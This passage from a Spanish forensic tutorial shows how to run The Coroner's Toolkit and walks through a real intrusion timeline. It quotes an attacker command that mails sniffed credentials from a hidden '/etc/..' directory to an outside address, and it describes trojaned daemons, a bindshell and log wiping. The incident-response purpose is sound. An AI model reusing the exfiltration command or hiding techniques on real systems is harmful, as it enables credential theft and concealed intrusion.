+caballos de Troya, backdoors, sustitución de ficheros legítimos del
+sistema operativo, descarga de herramientas, modificación de las
+librerías del sistema o instalación de rpm's/deb's/pkg's
+etc... También podemos ver desde aquí la creación de directorios
+ocultos, ejecución de los comandos de sistema operativo, compilación y
+ejecución de aplicaciones. Toda esa información que nunca se almacena
+de forma directa, puede ser extraída de la información que da mactime.
+</p></div><div class="sect1"><div class="titlepage"><div><h2 class="title" style="clear: both"><a name="id2757604"></a>9. Usando TCT </h2></div></div><p>
+Ahora, paso por paso, intentaremos instalar la aplicación The Coroners
+Toolkit, que nos servirá para recoger la información sobre el sistema
+de ficheros y analizarla. La herramienta no es un ejecutable que
+realiza todas las tareas, sino es una colección de utilidades
+diseñadas para efectuar una tarea determinada, siendo importante
+entender el funcionamiento de cada una de ellas para poder entender la
+función del toolkit en su totalidad.
+</p><div class="itemizedlist"><ul type="disc"><li><p>El primer paso es de desempaquetar el archivo tct-1.09.tar.gz y    copiarlo al directorio /usr/local/tct-1.09, luego debemos leer    detenidamente el fichero de instrucciones de instalación INSTALL.  </p><p>
+  La instalación de la aplicación debe ser realizada en una partición    donde haya mucho espacio ya que algunas aplicaciones suelen generar    una cantidad grande de información de salida por ejemplo unrm y    lazarus.</p></li><li><p>Ahora reconfiguremos los scripts utilizando perl reconfig, ya que    TCT utiliza rutas completas.</p></li><li><p>Limpiamos bien la distribución con un make clean; make all.</p></li><li><p>Leemos documentación del directorio docs/ para conocer los detalles    de funcionamiento del Toolkit.</p></li></ul></div><div class="orderedlist"><ol type="1"><li><p>ls -l docs</p></li></ol></div><pre class="programlisting">
+ total 34
+ -rw-r--r--   1 root     root         8572 Mar 28 12:41 README
+ -rw-r--r--   1 root     root         7162 Mar 28 12:39 grave-robber.README
+ -rw-r--r--   1 root     root        13944 Jan 16 13:34 lazarus.README
+ -rw-r--r--   1 root     root         2830 Mar 27 15:07 mac.README
+</pre><div class="itemizedlist"><ul type="disc"><li><p>Montamos la partición que debemos analizar en modo solo lectura y    nodev, bajo algún punto de montura.</p></li></ul></div><pre class="programlisting">
+ # mount -r /dev/hdd2 /mnt
+</pre><div class="itemizedlist"><ul type="disc"><li><p>Suponiendo que siendo root arrancamos la aplicación grave-robber    para que empiece a analizar el sistema de ficheros y procesos y    guardar los datos de los inodes en el fichero    data/activalink.com/base y data/activalink.com/base.S (binarios    sUID), el estado del sistema en el directorio    data/activalink.com/command_out/ etc...</p></li></ul></div><pre class="programlisting">
+ # bin/grave-robber -m /mnt
+</pre><p>
+Grave-robber, inicialmente realizará un análisis de todas las carpetas
+que están en el $PATH y a continuación empezará a analizar la
+partición montada /mnt. El análisis suele tardar bastante tiempo,
+según el tamaño de la partición que queremos analizar. Aparte de los
+inodes se guarda el estado general del sistema, es decir el output de
+las herramientas de monitorización del sistema como ps, top, w etc.
+</p><div class="itemizedlist"><ul type="disc"><li><p>Una vez terminado el trabajo del grave-robber, copiamos los ficheros    passwd y group del sistema comprometido al directorio tct-1.09/ para    que los tengamos a mano ya que en breve estaremos    analizándolos. Para que se pueda distinguirlos luego renombramos    estos ficheros passwd.victim o utilicemos el nombre del host    comprometido.</p></li><li><p>Ejecutamos luego la utilidad mactime especificando una fecha    anterior del compromiso (consideremos que la actividad del intruso    ha acabado hoy, pero no vamos a especificar hora). Necesitaremos    pasar los resultados de ejecución de mactime a un fichero para que    luego se pueda examinar su contenido con tranquilidad:</p></li></ul></div><pre class="programlisting">
+ # bin/mactime -p passwd.victim -g group.victim /mnt 06/01/2000 &gt; victim.mactime
+</pre><p>
+En la utilidad mactime hubo un bug en las versiones anteriores que
+hacía que la aplicación no funcione correctamente si se utilizaba la
+opción -p. Entonces hacíamos un &quot;work around&quot;, incorporando
+temporalmente el contenido del fichero /etc/passwd de la máquina
+víctima coincidir con él de nuestro sistema. En la versión actual este
+bug está solucionado.
+</p><div class="itemizedlist"><ul type="disc"><li><p>Hacemos una copia del fichero antes de empezar el análisis:</p></li></ul></div><pre class="programlisting">
+ # cp victim.mactime victim.mactime.evidence
+</pre><div class="itemizedlist"><ul type="disc"><li><p>Entonces podemos empezar analizando el fichero    victim.mactime.evidence. Usando el editor de texto favorito,    empecemos a revisarlo y marcar la actividad sospechosa. Sugiero que    pongamos los tags [MARK] para que luego con grep podamos localizar    nuestros apuntes.</p></li></ul></div><pre class="programlisting">
+ . . .
+ Feb 13 2000 01:10:50   50148 mca -rwxr-xr-x root     root     /x/dev/.
+ Feb 13 2000 01:10:52     564 m.c -rw-r--r-- root     root     /x/etc/profile
+ Feb 13 2000 01:11:00       5 mac -rw-r--r-- root     root     /x/lib/sp
+                        18110 .a. -rw-r--r-- root     root     /x/lib/tp
+ [MARK]
+ Feb 13 2000 01:12:08       0 ..c -rw-r--r-- root     root     /x/dev/ttyag
+                           25 ..c -rwxr-xr-x root     root     /x/dev/ttyfg
+                           23 ..c -rwxr-xr-x root     root     /x/dev/ttypg
+                       373176 ..c -rws--x--x root     root     /x/lib/...
+                         8268 ..c -rwxr-xr-x root     root     /x/lib/go
+                        20164 ..c -rwsr-xr-x root     root     /x/usr/bin/xcat
+                       183780 ..c -rwxr-xr-x root     root     /x/usr/sbin/find
+ Feb 13 2000 01:30:00    8268 .a. -rwxr-xr-x root     root     /x/lib/go
+ Feb 14 2000 10:42:03 1166856 .a. -rw-r--r-- root     root     /x/var/log/boot.log
+ [MARK]
+ Feb 14 2000 10:45:35   18110 m.c -rw-r--r-- root     root     /x/lib/tp
+ Feb 14 2000 10:57:42    2998 m.c -rw-r--r-- root     root     /x/etc/inetd.conf~
+ Feb 14 2000 11:01:47     168 .a. -rw-rw-r-- root     root     /x/root/.saves-1380-dragon~
+ Feb 14 2000 11:18:38     160 m.c -rw-r--r-- root     root     /x/etc/hosts.allow.old
+ Feb 14 2000 11:18:55     347 m.c -rw-r--r-- root     root     /x/etc/hosts.deny.old
+ Feb 14 2000 11:19:08       8 m.c -rw-r--r-- root     root     /x/etc/hosts.deny
+ Feb 14 2000 11:22:53     168 m.c -rw-rw-r-- root     root     /x/root/.saves-1380-dragon~
+ Feb 14 2000 11:30:30    2998 .a. -rw-r--r-- root     root     /x/etc/inetd.conf~
+ [MARK]
+ Feb 14 2000 11:31:25   20164 .a. -rwsr-xr-x root     root     /x/usr/bin/xcat
+ Feb 14 2000 11:34:10     868 m.c -rwxr-xr-x root     root     /x/etc/rc.d/rc.local
+  . . .
+</pre><div class="itemizedlist"><ul type="disc"><li><p>Después de repasar todo el listado de cambios históricos, puede que    tengamos alguna pista para seguir o puede que no. En el peor de los    casos debemos modificar la fecha especificada y cambiarla a la    anterior del compromiso, intentándolo de nuevo, o mirar más    detenidamente. Durante el examen del documento se prohibe distraerse    ya que la concentración es muy importante en este momento.</p></li><li><p>Otra opción es recuperar ficheros borrados con el la utilidad unrm y    luego examinarlos con el programa strings. Las dos utilidades unrm y    lazarus generan muchísima información y debemos tener bastante    espacio libre en la partición. Podemos determinar la cantidad de    espacio en disco duro que necesitamos, calculando de forma    aproximada a partir del informe de df.</p></li></ul></div><pre class="programlisting">
+ # df /mnt
+ Filesystem           1k-blocks      Used Available Use% Mounted on
+ /dev/hdb2              3028881   1604551   1267697  56% /mnt
+</pre><p>
+En nuestro ejemplo df muestra que tenemos 1267697 bloques sin ocupar,
+que significa que unrm puede llegar a generar aproximadamente 1.2 Gb
+de información. Encontremos una partición libre y almacenemos allí el
+dump (Importante: en el ejemplo utilizo el punto de montura del
+sistema comprometido y no del sistema de análisis):
+</p><pre class="programlisting">
+ # bin/unrm /dev/hdb2 &gt; /data/victim.hda2.unrm
+</pre><div class="itemizedlist"><ul type="disc"><li><p>Pero si disponemos de más espacio (más de 1.2Gb) y mucho más tiempo    para practicar con lazarus que procesará el espacio libre en el    disco duro y intentará recuperar ficheros por sus tipos. lazarus    genera una salida en formato HTML, que nos va a dar la oportunidad    de verla a través del navegador.</p></li></ul></div></div><div class="sect1"><div class="titlepage"><div><h2 class="title" style="clear: both"><a name="id2757994"></a>10. Ejemplo de Informe de Pruebas Encontradas </h2></div></div><p>
+Ahora vamos a examinar un informe completo de actividad del/los
+intrusos en el sistema. El informe fue obtenido tras analizar los
+ficheros log de los sniffers, intentos de acceso, timestamps en el
+sistema de ficheros y el contenido de las particiones de varios
+sistemas involucrados en el incidente. Es un informe real, sólo que
+está omitida la información que identifica el sistema atacado.
+</p><p>
+A continuación es un informe de análisis de la partición root del
+sistema 212.102.25.57, la información aparece tal como fue
+encontrada después de poner el disco off-line, una vez descubierto el
+compromiso, por sospecha de tener ejecutándose un sniffer. Una copia
+de sistema de ficheros está disponible en formato tar.gz en el cdrom
+ISO 9660 CD-R.
+</p><p>
+La máquina 212.102.25.57 fue una de las 19 sospechosas de estar
+comprometida por el mismo grupo de intrusos alrededor de 10-09-2001,
+utilizando Linux mountd buffer overflow bug documentado en el CERT
+Advisory CA-98.12:
+<a href="http://www.cert.org/advisories/CA-98.12.mountd.html" target="_top">http://www.cert.org/advisories/CA-98.12.mountd.html</a>.
+</p><p>
+El disco duro fue analizado utilizando herramientas creadas por Dan
+Farmer y Wietse Venema llamadas &quot;Coroner's Toolkit&quot;
+(<a href="http://www.fish.com/security/forensics.html" target="_top">http://www.fish.com/security/forensics.html</a>). En el sistema de
+análisis el disco aparece como dispositivo /dev/hdc. La primera
+partición, /dev/hdc1 fue montada en modo solo lectura bajo el punto de
+montura &quot;/x&quot;. Como resultado de ello todas las rutas serán precedidas
+por esa cadena. La geometría del disco duro es la siguiente:
+</p><pre class="programlisting">
+ Disk /dev/hdc: 32 heads, 63 sectors, 825 cylinders
+ Units = cylinders of 2016 * 512 bytes
+</pre><pre class="programlisting">
+    Device Boot    Start       End    Blocks   Id  System
+ /dev/hdc1             1       793    799312+  83  Linux
+ /dev/hdc2           794       825     32256   82  Linux swap
+</pre><p>
+Como la mayoría de los accesos al servidor empezaron el día 09 del
+Sep, la fecha previa del análisis forense fue tomada como 28 Ago. No
+se observan huellas obvias de modificación/instalación de ficheros que
+indica que el sistema fue accedido entre Sep 01 y Sep 04. El día Sep
+04, ha sido modificado el demonio &quot;r&quot; de Berkeley (&quot;in.rlogind&quot;).
+</p><pre class="programlisting">
+ Sep 04 01 23:42:21   23421 m.. -rwxr-xr-x root  root  /x/usr/sbin/in.rlogind
+</pre><p>
+El examen del contenido del fichero a través de la utilidad strings,
+muestra que es un caballo de Troya que contiene los mismos strings que
+han sido encontrados en los ficheros del grupo &quot;XXXXXXX&quot;
+</p><pre class="programlisting">
+ . . .
+ rlogind
+ ahLln
+ XXXXXXXX
+ Can't get peer name of remote host: %m
+ Can't get peer name of remote host
+ setsockopt (SO_KEEPALIVE): %m
+ setsockopt (IP_TOS): %m
+ hname != NULL
+ rlogind.c
+  . . .
+</pre><p>
+Pasados ocho días, se observa una modificación en el demonio y
+ejecución de chown.
+</p><pre class="programlisting">
+ Sep 12 01 11:04:10   23421 ..c -rwxr-xr-x root   root  /x/usr/sbin/in.rlogind
+ Sep 12 01 11:04:11    8156 .a. -rwxr-xr-x root   bin   /x/bin/chown
+</pre><p>
+Pasada media hora el fichero fuente &quot;linsniff.c&quot; se copia en un
+directorio oculto bajo /etc. El directorio se llama &quot;/etc/.. &quot;
+(punto-punto-espacio-espacio-espacio, lo que nosotros convertiremos en
+&quot;/etc/..___&quot; para ver más claramente el directorio en los listados. El
+programa luego se compila. Vemos que los ficheros de cabeceras que
+tienen que ver con las funciones de red han sido accedidos, y el
+binario se mueve al &quot;/usr/sbin/telnetd&quot;.
+</p><p>
+Después de cuatro minutos se produce un acceso a través del protocolo
+FTP (observando el acceso al wu.ftpd y su fichero id de proceso).
+</p><pre class="programlisting">
+ Sep 12 01 11:36:59    5127 m.c -rw-r--r-- root  root  /x/etc/..___/linsniff.c
+ Sep 12 01 11:37:08    4967 .a. -rw-r--r-- root  root  /x/usr/src/linuxelf-1.2.13/include/linux/if.h
+                       3143 .a. -rw-r--r-- root  root  /x/usr/src/linuxelf-1.2.13/include/linux/if_arp.h
+                       3145 .a. -rw-r--r-- root  root  /x/usr/src/linuxelf-1.2.13/include/linux/if_ether.h
+                       1910 .a. -rw-r--r-- root  root   /x/usr/src/linuxelf-1.2.13/include/linux/ip.h
+                       2234 .a. -rw-r--r-- root  root   /x/usr/src/linuxelf-1.2.13/include/linux/route.h
+                       1381 .a. -rw-r--r-- root  root   /x/usr/src/linuxelf-1.2.13/include/linux/tcp.h
+   Sep 12 01 11:37:10  2048 ..c drwxr-xr-x root  bin    /x/usr/sbin
+   Sep 12 01 11:37:14  2048 m.. drwxr-xr-x root  bin    /x/usr/sbin
+   Sep 12 01 11:37:15  8179 m.c -rwxr-xr-x root  root   /x/usr/sbin/telnetd
+   Sep 12 01 11:37:48  8179 .a. -rwxr-xr-x root  root   /x/usr/sbin/telnetd
+   Sep 12 01 11:41:52 77476 .a. -rwxr-xr-x root  bin    /x/usr/sbin/wu.ftpd
+   Sep 12 01 11:42:08  4096 mac -rw-r--r-- root  root   /x/var/pid/ftp.pids-remote
+</pre><p>
+Esa actividad se confirma recuperando el fichero eliminado de log
+desde la partición root:
+</p><pre class="programlisting">
+ Sep 12 11:33:05 2001 in.telnetd[1290]: connect from cromanion.washington.edu
+ Sep 12 11:33:16 2001 login: 1 LOGIN FAILURE FROM cromanion.washington.edu, 502
+ Sep 12 11:33:21 2001 login: 2 LOGIN FAILURES FROM cromanion.washington.edu, 502
+  . . .
+ Sep 12 11:34:02 2001 su: quaker on /dev/ttyp1
+ Sep 12 11:41:52 2001 wu.ftpd[1327]: connect from lotherdale.washington.edu
+ Sep 12 11:41:57 2001 ftpd[1327]: USER snoop
+ Sep 12 11:41:59 2001 ftpd[1327]: PASS password
+ Sep 12 11:42:00 2001 ftpd[1327]: SYST
+ Sep 12 11:42:01 2001 ftpd[1327]: CWD /tmp
+ Sep 12 11:42:06 2001 ftpd[1327]: TYPE Image
+ Sep 12 11:42:06 2001 ftpd[1327]: PORT
+ Sep 12 11:42:06 2001 ftpd[1327]: STOR mountd
+ Sep 12 11:42:08 2001 ftpd[1327]: QUIT
+ Sep 12 11:42:08 2001 ftpd[1327]: FTP session closed
+ Sep 12 12:00:25 2001 in.telnetd[1342]: connect from cromanion.washington.edu
+ Sep 12 12:00:25 2001 telnetd[1342]: ttloop:  peer died: Try again
+</pre><p>
+Desde lo que podemos observar se realiza una descarga de un exploit
+mountd mencionado anteriormente. También podemos conocer que el
+intruso tiene una cuenta en el sistema cromanion.washington.edu
+[215.12.10.2] que normalmente utiliza entre 14:33:05 y 15:00:25
+EST.
+</p><p>
+Los strings del fichero &quot;/usr/sbin/telnetd&quot; muestran que es un
+sniffer. El fichero log del sniffer es &quot;tcp.log&quot; (por defecto):
+</p><pre class="programlisting">
+ . . .
+ cant get SOCK_PACKET socket
+ cant get flags
+ cant set promiscuous mode
+ ----- [CAPLEN Exceeded]
+ ----- [Timed Out]
+ ----- [RST]
+ ----- [FIN]
+ %s =&gt; %s [%d]
+ eth0
+ tcp.log
+ cant open log
+ Exiting...
+  . . .
+</pre><p>
+El día 13 de Sep, otro programa que incorpora funciones de red se
+compila, que hace uso de muchos más recursos que el sniffer (ya que
+carga más librerías). El hecho que el binario no aparece con fecha de
+modificación o cambio, puede indicar que el binario fue ejecutado y
+eliminado por el intruso (otros intrusos o el administrador) para
+ocultar su presencia del equipo de administración del servidor.
+</p><pre class="programlisting">
+  Sep 13 01 10:01:46   55492 .a. -rwxr-xr-x root     root     /x/usr/bin/gcc
+                        6211 .a. -rw-r--r-- root     root     /x/usr/include/stdio.h
+                       92696 .a. -rwxr-xr-x root     root     /x/usr/lib/gcc-lib/i486-linux/2.7.0/cpp
+                        1003 .a. -rwxr-xr-x root     root     /x/usr/lib/gcc-lib/i486-linux/2.7.0/specs
+  Sep 13 01 10:01:47    2767 .a. -rw-r--r-- root     root     /x/usr/include/_G_config.h
+                        1441 .a. -rw-r--r-- root     root     /x/usr/include/alloca.h
+                        2040 .a. -rw-r--r-- root     root     /x/usr/include/confname.h
+                        1267 .a. -rw-r--r-- root     root     /x/usr/include/errno.h
+                        4186 .a. -rw-r--r-- root     root     /x/usr/include/features.h
+                        4434 .a. -rw-r--r-- root     root     /x/usr/include/gnu/types.h
+                        7917 .a. -rw-r--r-- root     root     /x/usr/include/libio.h
+                         380 .a. -rw-r--r-- root     root     /x/usr/include/posix_opt.h
+                        4419 .a. -rw-r--r-- root     root     /x/usr/include/signal.h
+                       15134 .a. -rw-r--r-- root     root     /x/usr/include/stdlib.h
+                        7537 .a. -rw-r--r-- root     root     /x/usr/include/string.h
+                        3909 .a. -rw-r--r-- root     root     /x/usr/include/sys/cdefs.h
+                        4538 .a. -rw-r--r-- root     root     /x/usr/include/sys/socket.h
+                         321 .a. -rw-r--r-- root     root     /x/usr/include/sys/types.h
+                       25129 .a. -rw-r--r-- root     root     /x/usr/include/unistd.h
+                        8841 .a. -r--r--r-- root     root     /x/usr/lib/gcc-lib/i486-linux/2.7.0/include/stddef.h
+                      1029 .a. -rw-r--r-- root     root     /x/usr/src/linuxelf-1.2.13/include/asm-i386/types.h
+                        6298 .a. -rw-r--r-- root     root     /x/usr/src/linuxelf-1.2.13/include/linux/errno.h
+                        2065 .a. -rw-r--r-- root     root     /x/usr/src/linuxelf-1.2.13/include/linux/signal.h
+                        2794 .a. -rw-r--r-- root     root     /x/usr/src/linuxelf-1.2.13/include/linux/socket.h
+                        3846 .a. -rw-r--r-- root     root     /x/usr/src/linuxelf-1.2.13/include/linux/sockios.h
+                        2621 .a. -rw-r--r-- root     root     /x/usr/src/linuxelf-1.2.13/include/linux/types.h
+  Sep 13 01 10:01:48    3668 .a. -rw-r--r-- root     root     /x/usr/include/arpa/inet.h
+                         734 .a. -rw-r--r-- root     root     /x/usr/include/bytesex.h
+                        1555 .a. -rw-r--r-- root     root     /x/usr/include/endian.h
+                        3248 .a. -rw-r--r-- root     root     /x/usr/include/limits.h
+                        6390 .a. -rw-r--r-- root     root     /x/usr/include/netdb.h
+                        2663 .a. -rw-r--r-- root     root     /x/usr/include/netinet/in.h
+                        3562 .a. -rw-r--r-- root     root     /x/usr/include/paths.h
+                        2643 .a. -rw-r--r-- root     root     /x/usr/include/posix1_lim.h
+                        2680 .a. -rw-r--r-- root     root     /x/usr/include/posix2_lim.h
+                        3777 .a. -rw-r--r-- root     root     /x/usr/include/sys/bitypes.h
+                         709 .a. -rw-r--r-- root     root     /x/usr/include/sys/param.h
+                        2315 .a. -rw-r--r-- root     root     /x/usr/include/sys/time.h
+                        5273 .a. -rw-r--r-- root     root     /x/usr/include/sys/wait.h
+                        2852 .a. -rw-r--r-- root     root     /x/usr/include/time.h
+                        1156 .a. -rw-r--r-- root     root     /x/usr/include/waitflags.h
+                        3724 .a. -rw-r--r-- root     root     /x/usr/include/waitstatus.h
+                     1418196 .a. -rwxr-xr-x root     root     /x/usr/lib/gcc-lib/i486-linux/2.7.0/cc1
+                      3049 .a. -rw-r--r-- root     root     /x/usr/lib/gcc-lib/i486-linux/2.7.0/include/limits.h
+                      330 .a. -r--r--r-- root     root     /x/usr/lib/gcc-lib/i486-linux/2.7.0/include/syslimits.h
+                      2101 .a. -rw-r--r-- root     root     /x/usr/src/linuxelf-1.2.13/include/asm-i386/byteorder.h
+                       266 .a. -rw-r--r-- root     root     /x/usr/src/linuxelf-1.2.13/include/asm-i386/param.h
+                        3965 .a. -rw-r--r-- root     root     /x/usr/src/linuxelf-1.2.13/include/linux/in.h
+                         720 .a. -rw-r--r-- root     root     /x/usr/src/linuxelf-1.2.13/include/linux/limits.h
+                          78 .a. -rw-r--r-- root     root     /x/usr/src/linuxelf-1.2.13/include/linux/param.h
+                        1146 .a. -rw-r--r-- root     root     /x/usr/src/linuxelf-1.2.13/include/linux/time.h
+                         313 .a. -rw-r--r-- root     root     /x/usr/src/linuxelf-1.2.13/include/linux/version.h
+                         698 .a. -rw-r--r-- root     root     /x/usr/src/linuxelf-1.2.13/include/linux/wait.h
+  Sep 13 01 10:01:57  117668 .a. -rwxr-xr-x root     bin      /x/usr/bin/as
+  Sep 13 01 10:01:58  145695 .a. -rwxr-xr-x root     bin      /x/usr/bin/ld
+  Sep 13 01 10:01:59    1088 .a. -rw-r--r-- root     root     /x/usr/lib/crt1.o
+                        1216 .a. -rw-r--r-- root     root     /x/usr/lib/crtbegin.o
+                        1212 .a. -rw-r--r-- root     root     /x/usr/lib/crtend.o
+                         624 .a. -rw-r--r-- root     root     /x/usr/lib/crti.o
+                         396 .a. -rw-r--r-- root     root     /x/usr/lib/crtn.o
+                      204146 .a. -rw-r--r-- root     root     /x/usr/lib/gcc-lib/i486-linux/2.7.0/libgcc.a
+</pre><p>
+El día 14 se ejecuta un cliente de ftp &quot;ncftp&quot;:
+</p><pre class="programlisting">
+  Sep 14 01 00:42:50  146881 .a. -rwxr-xr-x root     bin      /x/usr/bin/ncftp
+</pre><p>
+Los índices de acceso del sistema cromanion.washington.edu (aka &quot;cromanion&quot;)
+muestran un login al sistema quaker.washington.edu (aka &quot;quaker&quot;) a las
+14:03 del horario EST o +0300 horas más de PST), lo que describe las
+conexiones de las máquinas lotherdale.washington.edu,
+XXXXXXXXXXXXX.washington.edu, y XXXXXXXXXXXX.washington.edu:
+</p><pre class="programlisting">
+ XXX      ftp          XXXXXXXX.XXXXXXX Sat Sep 14 03:46 - 04:08  (00:21)
+ XXX      ftp          XXXXXXX.washingt Sat Sep 14 03:46 - 03:46  (00:00)
+ XXX      ftp          XXXXXXX.XXXXXXX Sat Sep 14 03:38 - 03:40  (00:02)
+ XXX      ftp          XXXXXXXXXXXXX.wa Sat Sep 14 03:37 - 03:39  (00:02)
+ XXX      ftp          XXXXXXXXXXXX.was Sat Sep 14 03:19 - 03:20  (00:00)
+</pre><p>
+Hay solo una ocurrencia de utilización del comando &quot;ncftp&quot; registrada
+por el sniffer el día 14 del Sep (línea 347 en &quot;tcp.log&quot;). También
+podemos encontrar huellas de otra conexión del XXXXX.XXXX.XXX:
+</p><pre class="programlisting">
+ XXXXXXXXXXXXX.washington.edu =&gt; XXXXXXX.washington.edu [23]
+  !&quot;'%W#$ 38400,38400vt100bdoor
+ password
+ w
+ su r00t
+ cd /etvc
+ cd &quot;..   &quot;
+ ls
+ cat /etc/&quot;..   &quot;/tcp.log | mail hackeraccount@hotmail.com
+ cat /etc/&quot;..   &quot;/tcp.log | mail hackeraccount@hotmail.com
+ ncftp -u ls
+ cp tcp.log 1
+ ls
+ ncftp -y XXX.XXX
+ [A[D[D[D[D[D[D[D[Du
+</pre><pre class="programlisting">
+ ----- [Timed Out]
+</pre><p>
+El log de la sesión anterior muestra que el fichero log del sniffer ha
+sido enviado a una dirección de correo electrónico. Después de cuatro
+horas, alguien emite un comando &quot;whoami&quot;, y luego añade y elimina
+algunos ficheros dentro del directorio oculto.
+</p><pre class="programlisting">
+ Sep 14 01 04:07:42    3797 .a. -rwxr-xr-x root     bin      /x/usr/bin/whoami
+ Sep 14 01 04:08:18    1024 m.c drwxr-xr-x root     root     /x/etc/..___
+</pre><p>
+El día 14 del Sep, se ejecuta el binario in.identd. Este servicio
+sirve para asociar el nombre de usuario con un intento de conexión a
+un servicio remoto. Esta aplicación se utiliza por algunas redes de
+IRC. Puede significar que alguien realizó una conexión a un servidor
+IRC desde la máquina comprometida.
+</p><p>
+También tuvieron lugar varias conexiones al servidor POP de correo
+&quot;in.pop3d&quot;, al servicio Berkeley &quot;r&quot;, &quot;in.rlogind&quot;, y una conexión al
+servicio NFS &quot;rpc.mountd&quot;. Una vez establecida la conexión, se ejecutó
+el comando &quot;id&quot; (este es un vestigio de un exloit ADM mountd buffer
+overrun).
+</p><p>
+El exploit suele crear un shell iniciado a partir del UID del servicio
+NFS mountd, que suele ser UID=0. El intruso, aprovechando del shell,
+crea un directorio &quot;/var/tmp/XXXXX&quot; y instala varias puertas traseras,
+utilidades para limpiar los ficheros log y un sniffer. Modificación de
+algunos ficheros log indican que a la hora de entrada se ejecutaron
+las utilidades de eliminación de huellas (zapper) que restablecieron
+el tamaño del fichero log a 0 bytes.
+</p><pre class="programlisting">
+  Sep 14 01 20:25:14   13004 .a. -rwxr-xr-x root     bin      /x/usr/sbin/in.identd
+  Sep 14 01 22:24:52   15029 .a. -rwxr-xr-x root     bin      /x/usr/sbin/in.pop3d
+  Sep 15 01 02:22:24   23421 .a. -rwxr-xr-x root     root     /x/usr/sbin/in.rlogind
+  Sep 15 01 02:23:07   25217 .a. -rwxr-xr-- root     bin      /x/usr/sbin/rpc.mountd
+  Sep 15 01 02:23:08    7705 .a. -rwxr-xr-x root     bin      /x/usr/bin/id
+  SepX 15 01 02:24:22   28550 mac -rwxr-xr-x root     root     /x/var/tmp/XXXXX/programs/fix
+                       13508 .a. -rwxr-xr-x root     root     /x/var/tmp/XXXXX/programs/login.bak
+  Sep 15 01 02:24:23   13508 m.c -rwxr-xr-x root     root     /x/var/tmp/XXXXX/programs/login.bak
+                        1375 mac -rwxr-xr-x root     root     /x/var/tmp/XXXXX/programs/readme
+  Sep 15 01 02:24:39   26314 m.c -rwxr-xr-x root     root     /x/var/tmp/XXXXX/programs/bindshell
+                       27942 m.c -rwxr-xr-x root     root     /x/var/tmp/XXXXX/programs/linsniffer
+  Sep 15 01 02:24:41   26314 .a. -rwxr-xr-x root     root     /x/var/tmp/XXXXX/programs/bindshell
+                       27942 .a. -rwxr-xr-x root     root     /x/var/tmp/XXXXX/programs/linsniffer
+  Sep 15 01 02:24:43    1126 m.c -rwxr-xr-x root     root     /x/var/tmp/XXXXX/programs/clean
+                          XX mac -rwxr-xr-x root     root     /x/var/tmp/XXXXX/programs/imapdis
+  Sep 15 01 02:24:59    4665 .a. -rwxr-xr-x root     bin      /x/usr/bin/basename
+  Sep 15 01 02:25:03       0 mac -rw-r--r-- root     root     /x/var/log/cron
+  Sep 15 01 02:25:04       0 ma. crw-rw-rw- root     root     /x/dev/ttyp3
+  Sep 15 01 02:25:06       0 .a. -rw-r--r-- root     root     /x/var/log/debug
+  Sep 15 01 02:25:08       0 .a. -rw-r--r-- root     root     /x/var/log/lastlog
+  Sep 15 01 02:25:12    2699 .a. -rw-r--r-- root     root     /x/var/log/syslog
+  Sep 15 01 02:25:15  131968 .a. -rwxr-xr-x root     bin      /x/usr/bin/gawk
+                        5941 .a. -rwxr-xr-x root     bin      /x/usr/bin/wc
+                           0 .a. -rw-r--r-- root     root     /x/var/log/xferlog
+                        1024 m.c drwxr-xr-x root     root     /x/var/tmp/XXXXX
+                        1126 .a. -rwxr-xr-x root     root     /x/var/tmp/XXXXX/programs/clean
+  Sep 15 01 02:25:54    2802 m.c -rwxr-xr-x root     root     /x/etc/rc.d/rc.inet2
+  Sep 15 01 02:26:13   12288 m.c -rw-rw-r-- root     root     /x/etc/psdevtab
+  Sep 15 XX 02:26:26    7416 .a. -rwxr-xr-x root     bin      /x/bin/mkdir
+  Sep 15 01 02:26:33      15 m.c -rw-r--r-- root     root     /x/dev/XXXXXXXX/LS
+  Sep 15 01 02:26:40    1024 m.c drwxr-xr-x root     root     /x/dev/XXXXXXXX
+                          25 m.c -rw-r--r-- root     root     /x/dev/XXXXXXXX/PS
+  Sep 15 01 02:28:37       0 .a. crw-rw-rw- root     root     /x/dev/ptyp2
+  Sep 15 01 02:28:38       0 m.c crw-rw-rw- root     root     /x/dev/ptyp2
+                           0 mac crw-rw-rw- root     root     /x/dev/ttyp2
+  Sep 15 01 02:29:58       0 m.c -rw-r--r-- root     root     /x/var/log/lastlog
+  Sep 15 01 02:30:06       0 m.c -rw-r--r-- root     root     /x/var/log/xferlog
+  Sep 15 01 02:31:03   66973 .a. -rwxr-xr-x root     bin      /x/bin/telnet
+  Sep 15 01 02:35:01    1024 m.c drwxr-xr-x root     root     /x/var/log
+                           0 mac -rw-r--r-- root     root     /x/var/log/sulog
+  Sep 15 01 02:35:16       0 m.c -rw-r--r-- root     root     /x/var/log/debug
+  Sep 15 01 02:35:51       0 ma. crw-rw-rw- root     root     /x/dev/ptyp3
+  Sep 15 01 02:35:52       0 ..c crw-rw-rw- root     root     /x/dev/ptyp3
+                           0 ..c crw-rw-rw- root     root     /x/dev/ttyp3
+  Sep 15 01 03:21:57    1649 m.. -rw-r--r-- root     root     /x/etc/passwd.OLD
+  Sep 15 01 03:22:24    7317 .a. -rwxr-xr-x root     bin      /x/bin/killall
+  Sep 15 01 03:22:40   58605 .a. -rwxr-xr-x root     bin      /x/bin/ps
+                          25 .a. -rw-r--r-- root     root     /x/dev/XXXXXXXX/PS
+</pre><p>
+La siguiente actividad aparece en la línea 471 en &quot;tcp.log&quot; (el
+fichero log del sniffer entre 14 Sep 03:46 de la línea 348 y 17 Sep
+20:13, desde la fecha de última modificación del fichero):
+</p><pre class="programlisting">
+ IIIIIIIIII.XXXXXXX.XXX.XX =&gt; XXXXXXX.washington.edu [143]
+</pre><pre class="programlisting">
+ ----- [Timed Out]
+</pre><pre class="programlisting">
+ IIIIIIIIII.XXXXXXX.XXX.XX =&gt; XXXXXXX.washington.edu [513]
+ rootXXXXlinux/38400
+ ----- [FIN]
+</pre><pre class="programlisting">
+ IIIIIIIIII.XXXXXXX.XXX.XX =&gt; XXXXXXX.washington.edu [513]
+ rootXXXX-linux/38400
+ ----- [FIN]
+</pre><pre class="programlisting">
+ IIIIIIIIII.XXXXXXX.XXX.XX =&gt; XXXXXXX.washington.edu [513]
+ rootr00tlinux/38400t
+ ----- [FIN]
+</pre><pre class="programlisting">
+ IIIIIIIIII.XXXXXXX.XXX.XX =&gt; XXXXXXX.washington.edu [23]
+  !&quot;'%P#$ 38400,38400linuxXXXXX
+</pre><pre class="programlisting">
+ XXX
+</pre><pre class="programlisting">
+ r00t
+ finger
+ cd /var/tmp
+ ls -al
